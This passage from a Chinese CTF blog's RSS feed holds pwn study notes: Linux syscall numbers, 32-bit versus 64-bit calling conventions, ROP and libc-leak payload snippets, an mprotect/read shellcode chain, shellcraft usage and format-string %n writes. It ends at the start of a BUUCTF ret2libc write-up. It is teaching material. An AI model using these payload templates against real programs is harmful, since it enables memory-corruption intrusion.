comment&#34;&gt;#define __NR_chmod 15&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_lchown 16&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_break 17&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_oldstat 18&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_lseek 19&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_getpid 20&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_mount 21&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_umount 22&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_setuid 23&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_getuid 24&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_stime 25&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_ptrace 26&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_alarm 27&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_oldfstat 28&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_pause 29&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_utime 30&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_stty 31&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_gtty 32&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_access 33&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_nice 34&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_ftime 35&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_sync 36&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_kill 37&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_rename 38&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_mkdir 39&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_rmdir 40&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;完整系统调用号:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3QuY3Nkbi5jbi9kcnN5eQ==&#34;&gt;http://t.csdn.cn/drsyy&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;2寄存器传参不同上面已经说明过了&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2寄存器传参不同上面已经说明过了&#34;&gt;#&lt;/a&gt; 2. 寄存器传参不同 (上面已经说明过了)&lt;/h3&gt;
&lt;h3 id=&#34;3进行系统调用方式不同&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3进行系统调用方式不同&#34;&gt;#&lt;/a&gt; 3. 进行系统调用方式不同&lt;/h3&gt;
&lt;p&gt;32 位系统通过 ** int 0x80 ** 中断进入系统调用&lt;/p&gt;
&lt;p&gt;64 位系统通过 ** syscall ** 命令进入系统调用&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3QuY3Nkbi5jbi9KejZIbQ==&#34;&gt;http://t.csdn.cn/Jz6Hm&lt;/span&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2023/08/24/pwn/PWN%E9%9B%B6%E7%A2%8E%E7%9F%A5%E8%AF%86/</guid>
            <title>PWN零碎知识</title>
            <link>http://example.com/2023/08/24/pwn/PWN%E9%9B%B6%E7%A2%8E%E7%9F%A5%E8%AF%86/</link>
            <category>pwn</category>
            <category>二进制</category>
            <pubDate>Thu, 24 Aug 2023 19:23:15 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;centerpwn零碎知识center&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#centerpwn零碎知识center&#34;&gt;#&lt;/a&gt; &amp;lt;center&amp;gt;PWN 零碎知识 &amp;lt;/center&amp;gt;&lt;/h1&gt;
&lt;h3 id=&#34;164位程序与32位程序payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#164位程序与32位程序payload&#34;&gt;#&lt;/a&gt; 1.64 位程序与 32 位程序 payload&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-python​&#34;&gt;	64位程序payload要先用pop_rdi覆盖ret然后依次是 调用函数的参数，调用函数本身，最后是返回地址（32位程序传参不需要用寄存器）
	32位程序是调用函数先函数本身，然后是函数返回地址，再是参数
	payload=b&amp;quot;\x00&amp;quot;*(0x50+8)+p64(rdi_ret)+p64(put_got)+p64(put_plt)+p64(0x4009A0)

    先是垃圾字符，然后pop_rdi,接着put_got是利用执行put_plt泄露的地址，最后是返回地址
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;2注意栈对齐ubuntu18以上格外注意&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2注意栈对齐ubuntu18以上格外注意&#34;&gt;#&lt;/a&gt; 2. 注意栈对齐（Ubuntu18 以上格外注意）&lt;/h3&gt;
&lt;h3 id=&#34;3泄露的函数接收时需要看其最后返回地址的函数是否有输出字符串如有则先接收返回地址输出的字符串&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3泄露的函数接收时需要看其最后返回地址的函数是否有输出字符串如有则先接收返回地址输出的字符串&#34;&gt;#&lt;/a&gt; 3 泄露的函数接收时，需要看其最后返回地址的函数是否有输出字符串，如有则先接收返回地址输出的字符串&lt;/h3&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#34;\x00&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x50&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rdi_ret&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;put_got&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;put_plt&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;返回地址&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendlineafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Input your Plaintext to be encrypted\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#返回地址中输出的字符串&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#返回地址中输出的字符串&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    puts&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;u64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;\n&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ljust&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;\0&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    puts&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;u64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ljust&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;\x00&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;4有时接收不能用u64precv会出错利用-u64precvuntilbn-1ljust8b0&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4有时接收不能用u64precv会出错利用-u64precvuntilbn-1ljust8b0&#34;&gt;#&lt;/a&gt; 4. 有时接收不能用 u64 (p.recv ()), 会出错，利用 u64 (p.recvuntil (b&#39;\n&#39;)[:-1].ljust (8,b&#39;\0&#39;))&lt;/h3&gt;
&lt;p&gt;###5 遇到要绕过 strlen 函数要绕过时用 b&amp;quot;\x00&amp;quot; 截断&lt;/p&gt;
&lt;h3 id=&#34;6系统调用是调用execvebinshnullnull平常调用为systembinsh&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6系统调用是调用execvebinshnullnull平常调用为systembinsh&#34;&gt;#&lt;/a&gt; 6. 系统调用是调用 execve (&amp;quot;/bin/sh&amp;quot;,NULL,NULL)【平常调用为 system (&amp;quot;/bin/sh&amp;quot;)】&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;32位程序系统调用号用 eax 储存, 第一 、 二 、 三参数分别在 ebx 、ecx 、edx中储存。 可以用 int 80 汇编指令调用

当eax=11时即为系统调用号调用命令execve，参数&amp;quot;/bin/sh&amp;quot;赋给ebx

64位程序系统调用号用 rax 储存, 第一 、 二 、 三参数分别在 rdi 、rsi 、rdx中储存。 可以用 syscall 汇编指令调用
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;7有mprotect函数可以改变内存的读写权限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#7有mprotect函数可以改变内存的读写权限&#34;&gt;#&lt;/a&gt; 7. 有 mprotect 函数可以改变内存的读写权限&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;mprotect(起始地址，修改内存长度，修改的权限（修改为7） )

指定的内存区间必须包含整个内存页(4k)，起始地址必须是页的起始地址(末尾为00?),修改区间的长度必须是页的整数倍

mem_addr (起始地址)= 0x80EB000   mem_size(内存长度) = 0x1000   mem_proc(权限) = 0x7 【32位程序时也可以找任意三个寄存器来传参(如pop ebx;pop exi;pop ebp;ret)，为了控制后续的返回地址】

在可以利用执行shellcode时可以用，修改一个位置可执行，然后调用read存入shellcode加以执行

payload=b&amp;quot;a&amp;quot;*0x2d

payload+=p32(mprotect)+p32(pop_ret)+p32(plt_got)+p32(0x100)+p32(0x7)

此处没有覆盖ebp，因为查看汇编ebp还未入栈，所以直接覆盖ret，后面的为调用3个寄存器

payload+=p32(read)+p32(pop_ret)+p32(0)+p32(plt_got)+p32(0x100)+p32(plt_got)

返回地址为read，

此处调用顺序为 执行函数，寄存器_返回地址，参数，函数返回地址(32位程序下，与一般32位不同，一般不调用寄存器)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;8shellcode编写&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#8shellcode编写&#34;&gt;#&lt;/a&gt; 8.shellcode 编写&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;用pwntools生成：

shellcode = asm(shellcraft.sh())

shellcode网址（用的时候不知道为什么不行）：

[https://www.exploit-db.com/](https://www.exploit-db.com/ &amp;quot;漏洞利用数据库 - 渗透测试人员、研究人员和道德黑客的漏洞利用 (exploit-db.com)&amp;quot;)

[http://shell-storm.org/shellcode/index.html](http://shell-storm.org/shellcode/index.html &amp;quot;Shellcodes database for study cases (shell-storm.org)&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;9strcmp绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#9strcmp绕过&#34;&gt;#&lt;/a&gt; 9.strcmp () 绕过&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/fc1eb2d3cb7a463e8599114af5c2da07.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h5 id=&#34;str1str2时返回0一般用这个绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#str1str2时返回0一般用这个绕过&#34;&gt;#&lt;/a&gt; str1=str2 时返回 0，一般用这个绕过&lt;/h5&gt;
&lt;h3 id=&#34;10switch语句&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#10switch语句&#34;&gt;#&lt;/a&gt; 10.switch () 语句&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;switch(表达式)&amp;#123; 
    case 常量表达式1:  语句1;
    case 常量表达式2:  语句2;
    … 
    case 常量表达式n:  语句n;
    default:  语句n+1;

&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;h5 id=&#34;将表达式的结果与常量表达式依次比较直到相同&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#将表达式的结果与常量表达式依次比较直到相同&#34;&gt;#&lt;/a&gt; 将表达式的结果与常量表达式依次比较直到相同&lt;/h5&gt;
&lt;h5 id=&#34;11-栈溢出注意输入的payload是不是再栈上有时不是输入在栈上后面可能会调用strcpy此时可能会将输入的payload复制到栈上需要按照复制后的栈填充垃圾字符等等&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#11-栈溢出注意输入的payload是不是再栈上有时不是输入在栈上后面可能会调用strcpy此时可能会将输入的payload复制到栈上需要按照复制后的栈填充垃圾字符等等&#34;&gt;#&lt;/a&gt; 11. 栈溢出注意输入的 payload 是不是再栈上，有时不是输入在栈上，后面可能会调用 strcpy ()，此时可能会将输入的 payload 复制到栈上，需要按照复制后的栈填充垃圾字符等等&lt;/h5&gt;
&lt;h3 id=&#34;12整数溢出漏洞比大小绕过判断&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#12整数溢出漏洞比大小绕过判断&#34;&gt;#&lt;/a&gt; 12. 整数溢出漏洞（比大小绕过判断），&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;无符号整型 unsigned int 遇到 -1 时会将 -1转化为该无符号整型的最大值

unsigned int ( -1 )=max unsigned int

int (-1)= -1

输入无符号整型时应该输入字符串（”-1“），不能是（b”-1“）
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;13格式化字符串漏洞不仅仅用来泄露canary还可以改变地址内的值&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#13格式化字符串漏洞不仅仅用来泄露canary还可以改变地址内的值&#34;&gt;#&lt;/a&gt; 13. 格式化字符串漏洞（不仅仅用来泄露 canary，还可以改变地址内的值）&lt;/h3&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;pwnme地址（&lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt;位是&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;字节）&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#34;a&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#34;%10$n&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    有printf&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;buf&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;会将输入的payload存入buf偏移为&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;的地方&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;该偏移需要利用aaaa&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p查看&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;，并且将&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;$前面的八字节大小视作&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;存入该地址&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;http://t.csdn.cn/1sJDx
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;###14.echo flag 【system(&amp;quot;echo flag&amp;quot;)】&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;输出字符串，后面跟什么就输出什么，这里输出&amp;quot;flag&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;###15.val=atoi(str)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;将str转为整数型字符串，当第一个字符不能识别为数字时，函数将停止读入输入字符串

str=&amp;quot;987654&amp;quot; ,val=(int)987654

str=&amp;quot;abc&amp;quot; ,      val=0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;###16. (char*)malloc(x*sizeof(char))&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;分配x字节连续的空间，从堆空间中分配，返回值为分配空间的首地址
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;​&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2023/05/04/pwn/buuctf-pwn/</guid>
            <title>buuctf.pwn</title>
            <link>http://example.com/2023/05/04/pwn/buuctf-pwn/</link>
            <category>pwn</category>
            <category>二进制</category>
            <category>ctf</category>
            <pubDate>Thu, 04 May 2023 19:33:55 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;#buuctf&lt;br /&gt;
##[HarekazeCTF2019]baby_rop2&lt;/p&gt;
&lt;p&gt;##pwn2_sctf_2016&lt;br /&gt;
&lt;img data-src=&#34;kerd.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;##&amp;lt;center&amp;gt;&lt;strong&gt;31.&lt;strong&gt;jarvisOJ_level3(&lt;strong&gt;ret2libc&lt;/strong&gt;)&amp;lt;/center&amp;gt;&lt;br /&gt;
####1. 下载源文后查看文件保护和位数&lt;br /&gt;
&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/06/pPsjif1.md.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
 ####2. 发现是 32 位程序，开启了 NX (栈不可执行)&lt;br /&gt;
####，利用 ida 反编译查看程序 C 语言代码&lt;br /&gt;
&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/06/pPsjPYR.md.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
 #### 发现有 vul 函数进入查看&lt;br /&gt;
&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/06/pPsjCk9.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
